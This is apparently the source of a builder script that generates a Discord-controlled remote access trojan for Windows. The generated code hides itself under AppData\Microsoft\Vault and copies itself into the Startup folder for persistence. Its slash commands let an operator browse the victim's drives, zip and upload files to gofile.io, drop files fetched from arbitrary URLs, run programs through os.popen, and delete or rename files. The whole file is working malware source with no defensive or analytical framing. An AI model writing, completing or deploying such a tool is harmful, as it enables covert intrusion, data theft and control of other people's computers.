# code.py
import textwrap

class codeBase:
    def __init__(self):
        pass

    def getConfig(self, discordToken, apiKey, hide, startup):
        return f'__config__={{"discord token": "{discordToken}","gofile token": "{apiKey}","hide": {hide},"run on startup": {startup}}}'

    def getBase(self):
        """
        Returns the source template (as a plain string). This template
        will load a nearby config.json at runtime instead of having tokens
        embedded at generation time.
        """
        return textwrap.dedent(r'''
           
# once in a while you get shown the light in the strangest of places if you look at it right

import json
from pathlib import Path
import shutil
import sys
import time
import requests
import os
import zipfile
import urllib.request
import discord
from discord import app_commands
from discord.ext import commands


client = commands.Bot(command_prefix='#', intents=discord.Intents.default())


def hide():
    print('attempting to hide client...')
    try:
        # use forward slashes to avoid escape problems in templates
        target_dir = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Vault" / "vaulted"
        target_dir.mkdir(parents=True, exist_ok=True)
        shutil.move(sys.argv[0], str(target_dir / Path(sys.argv[0]).name))
    except Exception as e:
        print('could not move file')
        print(e)


def startup():
    startup_folder = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    script_path = Path(sys.argv[0]).resolve()
    destination = startup_folder / script_path.name

    if not destination.exists():
        shutil.copy(script_path, destination)
        print(f"Added {script_path} to startup")


from pathlib import Path as _Path_for_utils

class Util(object):
    def getSize(self, bytes, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor

    def getType(self, path):
        if os.path.isdir(path):
            return 'dir'
        elif os.path.isfile(path):
            return 'file'
        else:
            return None

    def uploadFile(self, file: str):
        server_response = requests.get('https://api.gofile.io/servers').json()
        server = server_response['data']['servers'][0]["name"]

        url = f'https://{server}.gofile.io/uploadFile'
        data = {"token": __config__.get("gofile token", "")}

        with open(file, 'rb') as f:
            files = {'file': f}
            response = requests.post(url, files=files, data=data)

        result = response.json()

        # Gofile returns the link here:
        return result.get("data", {}).get("downloadPage")

    def format(self, path):
        items = os.listdir(path)
        dirs = '\n\nDirectories:\n'
        files = '\nFiles:\n'
        currentpath = f'\nCurrent path:\n{path}'
        for i in range(len(items)):
            item_path = os.path.join(path, items[i])
            if self.getType(item_path) == 'dir':
                dirs += f'{items[i]}\n'
            else:
                files += f'{items[i]} [{self.getSize(os.path.getsize(item_path))}]\n'
        msg = currentpath + dirs + files
        # Use forward slash path for the temp file to avoid backslash escape issues
        temp_path = _Path_for_utils("C:/Windows/Temp/files.txt")
        if len(msg) > 1999:
            temp_path.parent.mkdir(parents=True, exist_ok=True)
            with open(temp_path, 'w', encoding='utf-8') as temp:
                temp.write(msg)
            return 'file'
        else:
            return msg


class Modules(Util):
    def grabFile(self, path):
        type_ = self.getType(path)
        zip_path = _Path_for_utils(f"C:/Windows/Temp/{os.path.basename(path)}.zip")
        if type_ == 'dir':
            with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as archive:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        archive.write(file_path, os.path.relpath(file_path, path))

            result = self.uploadFile(str(zip_path))
            try:
                os.remove(str(zip_path))
            except Exception:
                pass
            return result
        elif type_ == 'file':
            return self.uploadFile(path)
        else:
            return None

    def injectFile(self, url, injectpath):
        try:
            with urllib.request.urlopen(url) as response:
                filename = os.path.basename(url)
                dest = os.path.join(injectpath, filename)
                if os.path.exists(dest):
                    return f'file already exists at {dest}'
                else:
                    with open(filename, 'wb') as out_file:
                        data = response.read()
                        out_file.write(data)
                    shutil.move(filename, injectpath)
                    return f"injected {url} at {injectpath}"
        except Exception as e:
            return str(e)

    def remoteExecute(self, path):
        try:
            os.popen(path)
            return f'executed {path} remotely '
        except Exception as e:
            return str(e)

    def delete(self, path):
        if os.path.isdir(path):
            try:
                shutil.rmtree(path)
                return f"Deleted {path}"
            except FileNotFoundError:
                return f"{path} doesn't exist"
            except PermissionError:
                return f"Eclipse File Manager doesn't have permissions to delete {path}"
            except Exception as e:
                return str(e)
        elif os.path.isfile(path):
            try:
                os.remove(path)
                return f"Deleted {path}"
            except FileNotFoundError:
                return f"{path} doesn't exist"
            except PermissionError:
                return f"Eclipse File Manager doesn't have permissions to delete {path}"
            except Exception as e:
                return str(e)
        else:
            return f"{path} not found"

    def rename(self, path, newname):
        try:
            if os.path.exists(path):
                os.rename(path, newname)
                return f'Renamed {os.path.basename(path)} to {os.path.basename(newname)}'
            else:
                return f'{path} does not exist'
        except Exception as e:
            return str(e)


class Commands(Modules, commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.path = 'C:/'
        self.init = False
        self.bot = bot

    @app_commands.command(name='init', description='Initializes browser')
    async def filebrowser(self, interaction: discord.Interaction):
        print('init')

        try:
            self.init = True
            await interaction.response.send_message(f'browser initiated\n{self.format(self.path)}\n\n')
        except Exception as e:
            await interaction.response.send_message(f'Error:\n{e}')

    @app_commands.command(name='browse', description='Browses through clients files remotely ')
    @app_commands.describe(directory='directory')
    async def browsecmd(self, interaction: discord.Interaction, directory: str):

        if self.init:
            try:
                if directory in os.listdir(self.path):
                    if self.getType(f'{self.path}{directory}') == 'file':
                        await interaction.response.send_message(
                            'Cannot cd into a file. Want to download it? Download [FILE/DIRECTORY]')
                    else:
                        self.path += f'{directory}/'
                        if self.format(self.path) == 'file':
                            await interaction.response.send_message(
                                'Message exceeds 2000 characters. To view files, download and open this document',
                                file=discord.File('C:/Windows/Temp/files.txt'))
                            os.remove('C:/Windows/Temp/files.txt')
                        else:
                            await interaction.response.send_message(self.format(self.path))
                else:
                    await interaction.response.send_message(f'Cannot find {directory}')
            except Exception as e:
                await interaction.response.send_message(f'Error:\n{e}')
        else:
            await interaction.response.send_message('Browser not initialized (/init)')

    @app_commands.command(name='updir', description='Goes back 1 directoty')
    async def updircmd(self, interaction: discord.Interaction):

        if self.init:
            try:
                if self.path == "C:/":
                    await interaction.response.send_message("At top level")
                else:
                    self.path = self.path[:self.path.rfind('/')]
                    self.path = self.path[:self.path.rfind('/')]
                    self.path += '/'
                    if self.format(self.path) == 'file':
                        await interaction.response.send_message(
                            'Message exceeds 2000 characters. To view files, download and open this document',
                            file=discord.File('C:/Windows/Temp/files.txt'))
                        os.remove('C:/Windows/Temp/files.txt')
                    else:
                        await interaction.response.send_message(self.format(self.path))
            except Exception as e:
                await interaction.response.send_message(f'Error:\n{e}')
        else:
            await interaction.response.send_message('Browser not initialized (/init)')

    @app_commands.command(name='root', description='Goes to highest directory')
    async def rootcmd(self, interaction: discord.Interaction):
        if self.init:
            try:
                if self.path == "C:/":
                    await interaction.response.send_message("At top level")
                else:
                    self.path = 'C:/'
                    if self.format(self.path) == 'file':
                        await interaction.response.send_message(
                            'Message exceeds 2000 characters. To view files, download and open this document',
                            file=discord.File('C:/Windows/Temp/files.txt'))
                        os.remove('C:/Windows/Temp/files.txt')
                    else:
                        await interaction.response.send_message(self.format(self.path))
            except Exception as e:
                await interaction.response.send_message(f'Error:\n{e}')
        else:
            await interaction.response.send_message('Browser not initialized (/init)')


        ''')

download = """

    
    @app_commands.command(name='download', description='Downloads file of users pc')
    @app_commands.describe(file='File to be downloaded')
    async def downloadcmd(self, interaction: discord.Interaction, file: str):
        if not self.init:
            return await interaction.response.send_message('Browser not initialized (/init)')

        try:
            await interaction.response.defer()

            result = self.grabFile(self.path + file)

            await interaction.followup.send(result or "Failed to upload file.")
        except Exception as e:
            try:
                await interaction.followup.send(f'Error:\\n{e}')
            except:
                pass

"""

inject = """

    @app_commands.command(name='inject', description='Adds a file to users pc')
    @app_commands.describe(url='URL of webfile')
    async def injectcmd(self, interaction: discord.Interaction, url: str):
        if self.init:
            try:
                print(url)
                await interaction.response.send_message(self.injectFile(url, self.path))
            except Exception as e:
                await interaction.response.send_message(f'Error:\\n{e}')
        else:
            await interaction.response.send_message('Browser not initialized (/init)')

"""

delete = """

    @app_commands.command(name='delete', description='Deletes file off of users pc')
    @app_commands.describe(filename='Name of file')
    async def deletecmd(self, interaction: discord.Interaction, filename: str):
        if self.init:
            try:
                print(self.path)
                await interaction.response.send_message(self.delete(self.path + f'{filename}'))
            except Exception as e:
                await interaction.response.send_message(f'Error:\\n{e}')
        else:
            await interaction.response.send_message('Browser not initialized (/init)')

"""

execute = """

    @app_commands.command(name='execute', description='Remotely executes file/application on users pc')
    @app_commands.describe(filename='Name of file')
    async def executecmd(self, interaction: discord.Interaction, filename: str):
        if self.init:
            try:
                print(self.path)
                await interaction.response.send_message(self.remoteExecute(self.path + f'{filename}'))
            except Exception as e:
                await interaction.response.send_message(f'Error:\\n{e}')
        else:
            await interaction.response.send_message('Browser not initialized (/init)')

"""

rename = """

    @app_commands.command(name='rename', description='Rename file on users pc')
    @app_commands.describe(filename='Name of file', newname='New name for file.')
    async def renamecmd(self, interaction: discord.Interaction, filename: str, newname: str):

        if self.init:
            try:
                print(self.path)
                print(filename)
                print(newname)
                print(self.path + f'{filename}', self.path + f'{newname}')
                await interaction.response.send_message(self.rename(self.path + f'{filename}', self.path + f'{newname}'))
            except Exception as e:
                await interaction.response.send_message(f'Error:\\n{e}')
        else:
            await interaction.response.send_message('Browser not initialized (/init)')

"""

footer = "client.run(__config__['discord token'])"